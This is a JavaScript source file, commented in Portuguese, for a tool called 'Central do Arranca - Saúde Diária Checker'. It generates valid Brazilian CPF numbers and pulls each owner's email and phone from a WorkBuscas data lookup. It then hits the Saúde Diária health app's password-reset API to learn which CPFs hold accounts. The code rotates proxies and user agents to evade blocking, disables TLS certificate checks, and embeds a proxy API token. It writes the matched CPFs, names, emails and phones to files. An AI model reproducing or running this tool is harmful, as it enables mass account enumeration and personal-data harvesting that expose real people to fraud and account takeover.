/**
 * Central do Arranca - Saúde Diária Checker
 * Checker específico para a API Saúde Diária
 * Gera CPF válido → Consulta WorkBuscas → Preenche payload → Testa API Saúde Diária
 */

const axios = require('axios');
const https = require('https');
const fs = require('fs-extra');
const path = require('path');
const WorkBuscasChecker = require('../workbuscas/checker');
let HttpsProxyAgent;
try {
  HttpsProxyAgent = require('https-proxy-agent');
} catch (_) {
  HttpsProxyAgent = null;
}

class SaudeChecker {
  constructor(options = {}) {
    this.proxyApiToken = 'qxew5x0zbdftbcsh63ql5flysll0jaf5u96msek9';
    this.proxyApiUrl = 'https://proxy.webshare.io/api/v2/proxy/list/';
    this.proxies = [];
    this.results = [];
    this.successCount = 0;
    this.errorCount = 0;
    this.registeredCount = 0;
    this.unregisteredCount = 0;
    this.batchSize = 20;
    this.delay = 2000;
    this.timeout = 10000;
    
    // API URL do Saúde Diária
    this.apiUrl = 'https://api-saudediaria.entregadigital.app.br/api/v1/app/resetpassword';
    
    // WorkBuscas Checker para buscar dados
    this.workbuscasChecker = new WorkBuscasChecker();
    
    // Cache de proxies - módulo Saúde
    this.cacheDir = path.join(__dirname, '../../.cache');
    this.cacheFile = path.join(this.cacheDir, 'proxies-saude.json');
    this.cacheExpiry = 24 * 60 * 60 * 1000; // 24 horas
  }
  
  /**
   * Gera um CPF válido aleatório
   */
  generateValidCPF() {
    function randomDigit() {
      return Math.floor(Math.random() * 10);
    }
    
    function calculateDigit(cpf, weights) {
      const sum = cpf.reduce((acc, digit, index) => acc + digit * weights[index], 0);
      const remainder = sum % 11;
      return remainder < 2 ? 0 : 11 - remainder;
    }
    
    // Gera os 9 primeiros dígitos
    const cpf = [];
    for (let i = 0; i < 9; i++) {
      cpf.push(randomDigit());
    }
    
    // Calcula o primeiro dígito verificador
    const weights1 = [10, 9, 8, 7, 6, 5, 4, 3, 2];
    cpf.push(calculateDigit(cpf, weights1));
    
    // Calcula o segundo dígito verificador
    const weights2 = [11, 10, 9, 8, 7, 6, 5, 4, 3, 2];
    cpf.push(calculateDigit(cpf, weights2));
    
    // Formata como string sem pontuação
    return cpf.join('');
  }
  
  /**
   * Formata telefone para +55XXXXXXXXXXX
   */
  formatPhone(phone) {
    if (!phone) return null;
    
    // Remove caracteres não numéricos
    let cleaned = phone.replace(/\D/g, '');
    
    // Se começa com 55, adiciona +
    if (cleaned.startsWith('55')) {
      return '+' + cleaned;
    }
    
    // Se começa com 0, remove o 0
    if (cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1);
    }
    
    // Adiciona código do país se não tiver
    if (cleaned.length >= 10 && !cleaned.startsWith('55')) {
      return '+55' + cleaned;
    }
    
    return cleaned.length >= 10 ? '+55' + cleaned : null;
  }

  /**
   * Cria configurações SSL padrão para requisições
   */
  getSSLConfig() {
    return {
      httpsAgent: new https.Agent({
        rejectUnauthorized: false,
        secureProtocol: 'TLSv1_2_method'
      }),
      proxy: false,
      maxRedirects: 5,
      validateStatus: function (status) {
        return status >= 200 && status < 300;
      }
    };
  }

  /**
   * Gera um User-Agent aleatório de navegador real
   */
  getRandomUserAgent() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  /**
   * Verifica se o cache de proxies é válido
   */
  isCacheValid() {
    try {
      if (!fs.existsSync(this.cacheFile)) {
        return false;
      }
      const stats = fs.statSync(this.cacheFile);
      const now = Date.now();
      const cacheAge = now - stats.mtime.getTime();
      return cacheAge < this.cacheExpiry;
    } catch (error) {
      return false;
    }
  }

  /**
   * Carrega proxies do cache
   */
  loadFromCache() {
    try {
      const cacheData = fs.readJsonSync(this.cacheFile);
      this.proxies = cacheData.proxies || [];
      console.log(`📦 ${this.proxies.length} proxies carregados do cache (Saúde)`);
      return this.proxies;
    } catch (error) {
      console.log('❌ Erro ao carregar cache:', error.message);
      return [];
    }
  }

  /**
   * Salva proxies no cache
   */
  async saveToCache(proxies) {
    try {
      await fs.ensureDir(this.cacheDir);
      const cacheData = {
        proxies: proxies,
        timestamp: Date.now(),
        count: proxies.length
      };
      await fs.writeJson(this.cacheFile, cacheData, { spaces: 2 });
      console.log(`💾 ${proxies.length} proxies salvos no cache (Saúde)`);
    } catch (error) {
      console.log('❌ Erro ao salvar cache:', error.message);
    }
  }

  /**
   * Carrega proxies da API Webshare
   */
  async loadProxies(progressCallback) {
    // Verifica cache primeiro
    if (this.isCacheValid()) {
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        this.proxies = cachedProxies;
        return this.proxies;
      }
    }
    
    console.log('🔄 [Saúde] Carregando proxies da Webshare...');
    
    try {
      const allProxies = [];
      let page = 1;
      const pageSize = 25;
      
      while (true) {
        const response = await axios.get(this.proxyApiUrl, {
          params: {
            mode: 'direct',
            page: page,
            page_size: pageSize
          },
          headers: {
            'Authorization': `Token ${this.proxyApiToken}`
          },
          timeout: 10000,
          ...this.getSSLConfig()
        });
        
        const proxies = response.data.results || [];
        if (proxies.length === 0) break;
        
        allProxies.push(...proxies);
        console.log(`📡 [Saúde] Carregados ${proxies.length} proxies da página ${page} (Total: ${allProxies.length})`);
        
        if (progressCallback) {
          progressCallback(allProxies.length);
        }
        
        page++;
        
        if (allProxies.length >= 1000) break;
        await new Promise(resolve => setTimeout(resolve, 200));
      }
      
      this.proxies = allProxies.slice(0, 1000);
      
      // Salva no cache
      await this.saveToCache(this.proxies);
      
      return this.proxies;
      
    } catch (error) {
      console.log('❌ [Saúde] Erro ao carregar proxies:', error.message);
      
      // Fallback para cache mesmo expirado
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        console.log('📦 [Saúde] Usando cache expirado como fallback');
        this.proxies = cachedProxies;
        return this.proxies;
      }
      
      throw error;
    }
  }

  /**
   * Obtém um proxy aleatório
   */
  getRandomProxy() {
    if (this.proxies.length === 0) {
      return null;
    }
    
    const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
    return {
      host: proxy.proxy_address,
      port: proxy.port,
      auth: proxy.username && proxy.password ? {
        username: proxy.username,
        password: proxy.password
      } : undefined
    };
  }

  /**
   * Consulta WorkBuscas para obter email e telefone
   */
  async consultWorkBuscas(cpf) {
    try {
      const result = await this.workbuscasChecker.makeAPIRequest(cpf);
      
      if (result.success && result.interpretation === 'found' && result.data) {
        const data = result.data;
        
        // Pega primeiro email disponível
        const email = data.email || (data.emails && data.emails.length > 0 ? data.emails[0].email : null);
        
        // Pega primeiro telefone disponível e formata
        let phone = null;
        if (data.telefones && data.telefones.length > 0) {
          phone = this.formatPhone(data.telefones[0].numero);
        } else if (data.telefone) {
          phone = this.formatPhone(data.telefone);
        }
        
        return {
          success: true,
          email: email,
          phone: phone,
          workbuscasData: data
        };
      }
      
      return {
        success: false,
        email: null,
        phone: null,
        workbuscasData: null
      };
    } catch (error) {
      console.error('[Saúde] Erro ao consultar WorkBuscas:', error.message);
      return {
        success: false,
        email: null,
        phone: null,
        workbuscasData: null
      };
    }
  }
  
  /**
   * Faz requisição à API Saúde Diária
   */
  async makeAPIRequest(cpf, email, phonenumber) {
    try {
      const payload = {
        email: email || 'email@exemplo.com',
        cpf: cpf,
        phonenumber: phonenumber || '+5511999999999',
        type: 'PWA'
      };
      
      const url = this.apiUrl;
      
      const axiosConfig = {
        method: 'post',
        url: url,
        data: payload,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'Accept': 'application/json'
        },
        timeout: this.timeout,
        ...this.getSSLConfig(),
        validateStatus: function (status) {
          return status >= 200 && status < 500;
        }
      };
      
      const response = await axios(axiosConfig);
      const status = response.status;
      const responseData = response.data || {};
      
      // Interpreta a resposta
      // Se retornar 200 ou sucesso, pode ser que o CPF está cadastrado
      // Se retornar erro específico, pode indicar CPF não cadastrado
      let interpretation = 'unknown';
      
      if (status === 200 || status === 201) {
        // Sucesso pode indicar que reset foi solicitado ou que CPF existe
        interpretation = 'registered';
      } else if (status === 400 || status === 404) {
        // Erro pode indicar CPF não encontrado
        interpretation = 'not_registered';
      } else if (status === 422) {
        // Erro de validação pode indicar dados inválidos ou CPF não existe
        interpretation = 'not_registered';
      } else {
        interpretation = 'error';
      }
      
      return {
        cpf: cpf,
        success: status >= 200 && status < 400,
        status: status,
        interpretation: interpretation,
        response: responseData,
        payload: payload,
        timestamp: new Date().toISOString()
      };
      
    } catch (error) {
      this.errorCount++;
      return {
        cpf: cpf,
        success: false,
        status: error.response?.status || 0,
        error: error.message,
        interpretation: 'error',
        timestamp: new Date().toISOString()
      };
    }
  }
  
  /**
   * Verifica um único CPF na API Saúde Diária
   * Lógica: Gera CPF → Consulta WorkBuscas → Preenche payload → Testa API
   */
  async checkCPF(cpf = null, showProxyInfo = false) {
    try {
      // Se CPF não foi fornecido, gera um válido
      if (!cpf) {
        cpf = this.generateValidCPF();
        console.log(`[Saúde] CPF gerado: ${cpf}`);
      }
      
      // Remove formatação do CPF
      cpf = cpf.replace(/\D/g, '');
      
      if (cpf.length !== 11) {
        return {
          cpf: cpf,
          success: false,
          error: 'CPF inválido',
          status: 0,
          interpretation: 'invalid',
          timestamp: new Date().toISOString()
        };
      }
      
      // Consulta WorkBuscas para obter email e telefone
      console.log(`[Saúde] Consultando WorkBuscas para CPF ${cpf}...`);
      const workbuscasResult = await this.consultWorkBuscas(cpf);
      
      let email = workbuscasResult.email;
      let phonenumber = workbuscasResult.phone;
      
      // Se não encontrou email ou telefone no WorkBuscas, usa valores padrão
      if (!email) {
        console.log(`[Saúde] Email não encontrado no WorkBuscas, usando padrão`);
        email = 'email@exemplo.com';
      }
      
      if (!phonenumber) {
        console.log(`[Saúde] Telefone não encontrado no WorkBuscas, usando padrão`);
        phonenumber = '+5511999999999';
      }
      
      console.log(`[Saúde] Dados obtidos - Email: ${email}, Phone: ${phonenumber}`);
      
      // Faz requisição à API Saúde Diária
      console.log(`[Saúde] Fazendo requisição à API Saúde Diária...`);
      const result = await this.makeAPIRequest(cpf, email, phonenumber);
      
      // Atualiza contadores
      if (result.success) {
        this.successCount++;
      } else {
        this.errorCount++;
      }
      
      if (result.interpretation === 'registered') {
        this.registeredCount++;
      } else if (result.interpretation === 'not_registered') {
        this.unregisteredCount++;
      }
      
      // Adiciona dados do WorkBuscas ao resultado
      result.workbuscas = workbuscasResult.workbuscasData;
      result.workbuscasSuccess = workbuscasResult.success;
      
      return result;
      
    } catch (error) {
      this.errorCount++;
      return {
        cpf: cpf || 'N/A',
        success: false,
        error: error.message,
        status: 0,
        interpretation: 'error',
        timestamp: new Date().toISOString()
      };
    }
  }

  /**
   * Verifica múltiplos CPFs
   */
  async checkMultipleCPFs(cpfs) {
    const results = [];
    
    if (this.proxies.length === 0) {
      await this.loadProxies();
    }
    
    for (const cpf of cpfs) {
      const result = await this.checkCPF(cpf);
      results.push(result);
      this.results.push(result);
      
      // Pequeno delay entre requisições
      await this.sleep(100);
    }
    
    return results;
  }

  /**
   * Salva resultados em arquivo
   */
  async saveResults(filename = null) {
    if (!filename) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0];
      filename = `saude-valid-cpfs-${timestamp}.txt`;
    }
    
    const listaDir = path.resolve(process.cwd(), 'lista', 'saude');
    if (!fs.existsSync(listaDir)) {
      fs.mkdirSync(listaDir, { recursive: true });
    }
    
    const filePath = path.join(listaDir, filename);
    
    let content = '='.repeat(60) + '\n';
    content += 'CENTRAL DO ARRANCA - SAÚDE DIÁRIA CHECKER\n';
    content += '='.repeat(60) + '\n\n';
    content += `Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
    content += `Total de resultados: ${this.results.length}\n`;
    content += `CPFs Cadastrados: ${this.registeredCount}\n`;
    content += `CPFs Não Cadastrados: ${this.unregisteredCount}\n`;
    content += `Erros: ${this.errorCount}\n\n`;
    content += '='.repeat(60) + '\n\n';
    
    // Filtra apenas CPFs cadastrados
    const validCPFs = this.results.filter(r => r.interpretation === 'registered');
    
    if (validCPFs.length > 0) {
      content += 'CPFS CADASTRADOS:\n';
      content += '='.repeat(60) + '\n\n';
      
      validCPFs.forEach((result, index) => {
        content += `${index + 1}. CPF: ${result.cpf}\n`;
        if (result.payload) {
          content += `   Email: ${result.payload.email}\n`;
          content += `   Telefone: ${result.payload.phonenumber}\n`;
        }
        if (result.workbuscas) {
          content += `   Nome: ${result.workbuscas.nome || 'N/A'}\n`;
        }
        content += `   Status: ${result.status}\n`;
        content += `   Data/Hora: ${new Date(result.timestamp).toLocaleString('pt-BR')}\n`;
        content += '\n';
      });
    }
    
    await fs.writeFile(filePath, content, 'utf8');
    console.log(`💾 [Saúde] Resultados salvos em: ${filePath}`);
    
    return filePath;
  }

  /**
   * Função de sleep
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = SaudeChecker;

